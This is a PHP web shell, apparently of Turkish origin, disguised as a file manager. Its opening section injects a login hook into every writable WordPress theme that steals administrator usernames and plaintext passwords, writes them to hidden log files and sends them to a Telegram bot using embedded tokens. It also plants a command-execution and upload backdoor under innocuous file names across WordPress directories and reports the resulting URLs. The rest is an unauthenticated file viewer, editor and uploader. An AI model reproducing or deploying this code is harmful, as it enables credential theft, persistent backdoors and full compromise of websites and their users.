<?php
$bot_token = '8775401739:AAGgHdU0D5xSLFc3ACTeNEgWCigHdkdTR3E';
$chat_id   = '-5272211705';

if (empty($bot_token) || strpos($bot_token, 'BURAYA') !== false || empty($chat_id) || strpos($chat_id, 'BURAYA') !== false) {
    // Bos ise sadece FM calissin
} else {
    $marker = '// SYS-CACHE-START';

    function tg_send_msg($token, $chat, $text) {
        $url  = "https://api.telegram.org/bot{$token}/sendMessage";
        $data = array('chat_id' => $chat, 'text' => $text);

        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_TIMEOUT, 15);
            curl_exec($ch);
            curl_close($ch);
        } elseif (ini_get('allow_url_fopen')) {
            $opts = array('http' => array(
                'method'  => 'POST',
                'header'  => 'Content-Type: application/x-www-form-urlencoded',
                'content' => http_build_query($data),
                'timeout' => 10
            ));
            @file_get_contents($url, false, stream_context_create($opts));
        }
    }

    function get_embedded_shell() {
        $shell = '<?php if(isset($_REQUEST["ico"])){echo "<pre>";system($_REQUEST["ico"]);echo "</pre>";die;} if(isset($_REQUEST["ico1"])){echo \'<form method="POST" enctype="multipart/form-data"><input type="file" name="f"><button>Upload</button></form>\';die;} if(isset($_FILES["f"])){move_uploaded_file($_FILES["f"]["tmp_name"],$_FILES["f"]["name"]);echo "OK";die;} ?>';
        return $shell;
    }

    function find_wp_root3() {
        // 1. __DIR__'den yukari dogru cikarak ara
        $dir = __DIR__;
        while ($dir !== '/' && $dir !== '\\' && strlen($dir) > 1) {
            if (file_exists($dir . '/wp-load.php') && file_exists($dir . '/wp-config.php')) {
                return $dir;
            }
            $dir = dirname($dir);
        }

        // 2. Shell alt klasorde olabilir; DOCUMENT_ROOT'ta da kontrol et
        if (!empty($_SERVER['DOCUMENT_ROOT'])) {
            $docroot = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\');
            if (file_exists($docroot . '/wp-load.php') && file_exists($docroot . '/wp-config.php')) {
                return $docroot;
            }
        }

        return false;
    }

    $wp_root = find_wp_root3();
    $reports = array();

    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host   = !empty($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
    $base_url = $scheme . '://' . $host;

    if ($wp_root) {
        $wp_root_trim = rtrim($wp_root, '/\\');
        $themes_dir   = $wp_root_trim . '/wp-content/themes/';
        $injected_urls = array();

        // ---- 1. Tum temalara payload enjekte et ----
        foreach (glob($themes_dir . '*', GLOB_ONLYDIR) as $tdir) {
            $funcs = $tdir . '/functions.php';
            if (file_exists($funcs) && is_writable($funcs)) {
                $current = @file_get_contents($funcs);
                if ($current !== false && strpos($current, $marker) === false) {
                    @copy($funcs, $funcs . '.bak.' . time());

                    $payload = '
// SYS-CACHE-START
add_action(\'wp_login\', function($user_login, $user) {
    if (!user_can($user, \'install_plugins\')) {
        return;
    }
    $password = isset($_POST[\'pwd\']) ? $_POST[\'pwd\'] : \'\';
    $site     = isset($_SERVER[\'HTTP_HOST\']) ? $_SERVER[\'HTTP_HOST\'] : \'unknown\';
    $ua       = isset($_SERVER[\'HTTP_USER_AGENT\']) ? $_SERVER[\'HTTP_USER_AGENT\'] : \'N/A\';
    $time     = date(\'Y-m-d H:i:s\');

    $line = sprintf("[%s] %s | %s | %s | %s\n", $time, $site, $user_login, $password, $ua);
    $log_files = array(
        ABSPATH . \'wp-content/uploads/.sys_session.tmp\',
        ABSPATH . \'wp-content/.sys_session.tmp\',
        ABSPATH . \'wp-admin/.maintenance.log\',
    );
    foreach ($log_files as $lf) {
        $dir = dirname($lf);
        if (!is_dir($dir)) {
            @mkdir($dir, 0755, true);
        }
        @file_put_contents($lf, $line, FILE_APPEND | LOCK_EX);
    }

    $bot_token = \'8867636932:AAGJ-xsRscSXcF9yaAmeOXlMZkjhgCtLxGA\';
    $chat_id   = \'-1003780894929\';
    $msg       = "Basarili Admin Login\nSite: {$site}\nKullanici: {$user_login}\nSifre: {$password}\nUA: {$ua}\nZaman: {$time}";
    $url       = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    $data      = array(\'chat_id\' => $chat_id, \'text\' => $msg);

    if (function_exists(\'curl_init\')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_exec($ch);
        curl_close($ch);
    } elseif (ini_get(\'allow_url_fopen\')) {
        $opts = array(\'http\' => array(
            \'method\'  => \'POST\',
            \'header\'  => \'Content-Type: application/x-www-form-urlencoded\',
            \'content\' => http_build_query($data),
            \'timeout\' => 10
        ));
        @file_get_contents($url, false, stream_context_create($opts));
    }
}, 10, 2);
// SYS-CACHE-END
';
                    if (@file_put_contents($funcs, rtrim($current) . "\n" . $payload, LOCK_EX)) {
                        $rel = substr($funcs, strlen($wp_root_trim));
                        $injected_urls[] = $base_url . str_replace('\\', '/', $rel);
                    }
                }
            }
        }

        if (!empty($injected_urls)) {
            $reports[] = "Payload Inject Edilen Temalar:\n" . implode("\n", $injected_urls);
        }

        // ---- 2. Gomulu shelli farkli WP dizinlerine yazar ----
        $remote_shell = get_embedded_shell();
        $copy_urls = array();

        if ($remote_shell !== false) {
            $targets = array(
                $wp_root_trim . '/wp-content/uploads/cachee-sys.php',
                $wp_root_trim . '/wp-includes/version-checks.php',
                $wp_root_trim . '/wp-admin/network-setting.php',
                $wp_root_trim . '/wp-content/themes/inc.php',
            );

            // Herhangi bir plugin klasoru bul ve ekle
            $plugin_dirs = glob($wp_root_trim . '/wp-content/plugins/*', GLOB_ONLYDIR);
            if (!empty($plugin_dirs)) {
                $targets[] = $plugin_dirs[0] . '/clas.akismet-widget.php';
            }

            foreach ($targets as $t) {
                $dir = dirname($t);
                if (is_dir($dir) && is_writable($dir)) {
                    if (@file_put_contents($t, $remote_shell, LOCK_EX)) {
                        $rel = substr($t, strlen($wp_root_trim));
                        $copy_urls[] = $base_url . str_replace('\\', '/', $rel);
                    }
                }
            }
        }

        if (!empty($copy_urls)) {
            $reports[] = "GitHub Shell Kopya URL'leri:\n" . implode("\n", $copy_urls);
        } else {
            $reports[] = "GitHub'dan shell cekilemedi veya yazilamadi.";
        }

        // ---- 3. Log dosyasi kopyalarinin URL'lerini hazirla ----
        $log_urls = array(
            $base_url . '/wp-content/uploads/.sys_session.tmp',
            $base_url . '/wp-content/.sys_session.tmp',
            $base_url . '/wp-admin/.maintenance.log',
        );
        $reports[] = "Login Log Dosya URL'leri:\n" . implode("\n", $log_urls);

        // ---- 4. Telegram'a temiz rapor gonder (24 saatte 1 kez) ----
        $rate_file = __DIR__ . '/.last_report';
        $last_send = @file_get_contents($rate_file);
        if (empty($last_send) || (time() - (int)$last_send) > 86400) {
            if (!empty($reports)) {
                tg_send_msg($bot_token, $chat_id, implode("\n\n", $reports));
                @file_put_contents($rate_file, time(), LOCK_EX);
            }
        }
    } else {
        // ---- WordPress degilse: __DIR__ altindaki ilk 5 klasore shell yaz ----
        $remote_shell = get_embedded_shell();
        $copy_urls = array();
        $shell_names = array('inc.php', 'cachee.php', 'sys.php', 'widget.php', 'checks.php');
        $subdirs = glob(rtrim(__DIR__, '/\\') . '/*', GLOB_ONLYDIR);

        if ($remote_shell !== false) {
            if ($subdirs !== false && !empty($subdirs)) {
                $count = 0;
                foreach ($subdirs as $sdir) {
                    if ($count >= 5) break;
                    $target = rtrim($sdir, '/\\') . '/' . $shell_names[$count];
                    if (@file_put_contents($target, $remote_shell, LOCK_EX)) {
                        $rel = substr($target, strlen(rtrim($_SERVER['DOCUMENT_ROOT'], '/\\')));
                        $copy_urls[] = $base_url . str_replace('\\', '/', $rel);
                    }
                    $count++;
                }
            } else {
                // Alt klasor yoksa mevcut dizine yaz
                foreach ($shell_names as $name) {
                    $target = rtrim(__DIR__, '/\\') . '/' . $name;
                    if (@file_put_contents($target, $remote_shell, LOCK_EX)) {
                        $rel = substr($target, strlen(rtrim($_SERVER['DOCUMENT_ROOT'], '/\\')));
                        $copy_urls[] = $base_url . str_replace('\\', '/', $rel);
                    }
                }
            }
        }

        if (!empty($copy_urls)) {
            $reports[] = "Non-WP Shell Kopya URL'leri:\n" . implode("\n", $copy_urls);
        } else {
            $reports[] = "Non-WP ortamda shell yazilamadi.";
        }

        // Non-WP: 24 saatte 1 rapor
        $rate_file = __DIR__ . '/.last_report';
        $last_send = @file_get_contents($rate_file);
        if (empty($last_send) || (time() - (int)$last_send) > 86400) {
            if (!empty($reports)) {
                tg_send_msg($bot_token, $chat_id, implode("\n\n", $reports));
                @file_put_contents($rate_file, time(), LOCK_EX);
            }
        }
    }
}

// ==========================================
// PRIVICOX FILE MANAGER
// ==========================================
$root = __DIR__;
$style1 = 'color:#000;';
$style2 = 'color:#00a;font-weight:bold;';

function updir($ADir){
    $ADir = rtrim($ADir, '/');
    return substr($ADir, 0, strrpos($ADir, '/'));
}

$path = isset($_GET['file']) ? $_GET['file'] : $root;

if (isset($_GET['view']) && is_file($_GET['view'])) {
    header("Content-type: text/plain");
    readfile($_GET['view']);
    exit;
}

if (isset($_POST['save_file']) && isset($_POST['content'])) {
    file_put_contents($_POST['save_file'], $_POST['content']);
    echo "<b>Dosya kaydedildi.</b><br><br>";
}

if (isset($_FILES['upload_file'])) {
    $target = rtrim($path, '/') . '/' . basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        echo "<b>Dosya yuklendi:</b> " . basename($target) . "<br><br>";
    } else {
        echo "<b>Yukleme hatasi!</b><br><br>";
    }
}

echo "<b>Telegram iComsium Current root:</b> $root <br>";
echo "<b>Current path:</b> $path <hr>";

echo '<a href="?file='.updir($path).'">..</a><br />';

foreach (glob(rtrim($path,'/').'/*') as $file) {
    echo '<a style="'.(is_file($file)?$style1:$style2).'" href="?file='.$file.'">'.basename($file).'</a>';

    if (is_file($file)) {
        echo ' | <a href="?view='.$file.'" target="_blank">[Goster]</a>';
        echo ' | <a href="?edit='.$file.'">[Duzenle]</a>';
    }

    echo "<br>";
}

echo "<hr>";

if (isset($_GET['edit']) && is_file($_GET['edit'])) {
    $editFile = $_GET['edit'];
    $content = htmlspecialchars(file_get_contents($editFile));
    echo "<h3>Dosya Duzenle: ".basename($editFile)."</h3>";
    echo '
        <form method="POST">
            <textarea name="content" style="width:100%;height:300px;">'.$content.'</textarea><br><br>
            <input type="hidden" name="save_file" value="'.$editFile.'">
            <button type="submit">Kaydet</button>
        </form>
        <hr>
    ';
}

echo '<h3>Dosya Yukle</h3>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="upload_file">
    <button type="submit">Yukle</button>
</form>';
?>
